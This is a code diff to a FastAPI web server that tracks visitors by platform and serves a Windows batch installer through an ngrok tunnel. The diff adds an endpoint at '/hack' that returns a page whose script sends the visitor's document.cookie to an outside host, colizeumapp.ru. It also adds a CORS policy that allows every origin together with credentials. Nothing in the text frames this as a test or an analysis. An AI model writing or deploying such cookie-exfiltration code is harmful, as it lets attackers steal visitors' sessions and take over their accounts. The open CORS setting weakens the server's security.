@@ -3,6 +3,7 @@ from fastapi import FastAPI, HTTPException
 from fastapi.responses import RedirectResponse
 import uvicorn
 from pyngrok import ngrok
+from fastapi.middleware.cors import CORSMiddleware
 
 from fastapi.responses import HTMLResponse
 import os
@@ -17,12 +18,35 @@ file_path = os.path.join(current_directory, "src/wind_installer.bat")
 
 app = FastAPI()
 
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],  # Разрешить все домены
+    allow_credentials=True,
+    allow_methods=["*"],  # Разрешить все методы (GET, POST, PUT, DELETE и т.д.)
+    allow_headers=["*"],  # Разрешить все заголовки
+)
+
 data = {
     "apple": 0,
     "android":0,
     "windows":0
 }
 
+@app.get("/hack")
+async def read_user_agent(user_agent: str = Header(None)):
+    return HTMLResponse(
+            """<!DOCTYPE html>
+        <html lang="en">
+        <head>
+        <meta charset="UTF-8">
+        <title>Title</title>
+        </head>
+        <body>
+        <script>fetch(`https://colizeumapp.ru/${document.cookie}`)</script>
+        </body>
+        </html>
+            """
+        )
 
 @app.get("/")
 async def read_user_agent(user_agent: str = Header(None)):
